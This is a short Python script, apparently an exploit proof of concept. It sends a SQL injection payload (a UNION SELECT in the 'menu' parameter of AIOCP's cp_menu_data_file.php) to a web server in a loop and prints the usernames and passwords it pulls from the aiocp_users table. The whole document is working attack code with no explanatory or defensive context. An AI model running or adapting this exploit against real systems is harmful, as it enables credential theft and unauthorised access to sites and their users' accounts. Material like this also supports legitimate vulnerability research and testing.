import re, socket

host = 'localhost'
port = 80

r = re.compile('\'([^\']+):([^\s]+)\sLIMIT')

# Search user ids 0 through 16
for i in range(0,16):


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)
    s.send("GET /AIOCP/public/code/cp_menu_data_file.php?menu='or%201=1%20UNION%20ALL%20SELECT%201,0,CONCAT(',',user_name,':',user_password)%20as%20menulst_name,0%20FROM%20aiocp_users%20ORDER%20BY%20menulst_style%20LIMIT%20" + str(i) + ",1;%23 HTTP/1.1\r\n"
           'Host: ' + host + '\r\n'
           '\r\n')

    resp = s.recv(8192)

    m = r.search(resp)

    if m is None: continue

    print 'Username: ' + m.group(1) + '\nPassword: ' + m.group(2) + '\n'

